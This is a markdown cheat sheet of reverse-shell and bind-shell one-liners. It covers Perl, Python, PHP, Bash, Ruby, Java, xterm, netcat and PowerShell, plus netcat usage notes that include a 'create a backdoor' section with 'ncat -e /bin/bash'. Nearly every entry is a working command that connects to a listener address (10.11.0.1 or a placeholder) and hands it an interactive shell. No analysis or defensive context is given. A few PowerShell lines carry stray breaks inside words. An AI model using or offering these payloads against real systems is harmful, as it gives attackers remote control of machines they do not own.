- [Perl](#Perl)
- [Python](#Python)
- [PHP](#PHP)
- [Bash](#Bash)
- [Ruby](#Ruby)
- [Java](#Java)
- [xterm](#xterm)
- [nc](#nc)
- [powershell](#powershell)

### Perl
```
perl -e 'use Socket;$i="10.11.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```
php -r '$sock=fsockopen("10.11.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Bash
```
bash -i >& /dev/tcp/10.11.0.1/8080 0>&1

bash -c 'bash -i >& /dev/tcp/10.11.0.1/8080 0>&1'
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("<your _p>",<your_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### xterm
```
xterm -display 10.11.0.1:1
```

### nc
- Listen to inbound connections
```
ncat -l 8080
```

- Connect to remote system
```
ncat [ip] [port]
```

- Listen to inbound connections UDP ports
```
ncat -l -u [port]
  check netstat -tunlp | grep [port]
```

- Connect to remote system UDP
```
ncat -v -u [ip] [port]
```

- nc as a proxy
```
 ncat -l port1 | ncat [ip] [port2]
  Now all the connections coming to our server on port [port1] will be automatically redirected to [ip] server on port [port2]
```

- create a backdoor
```
ncat -l [port] -e /bin/bash
ncat [ip] [port]
```

- netcat as bind shell
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

- netcat as reverse shell
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### powershell

- Reverse shell
```
$client = New-Object System.Net.Sockets.TCPClient('[your_ip]',[your_port]);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()
```

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Bind shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client
= $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
S ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"
```


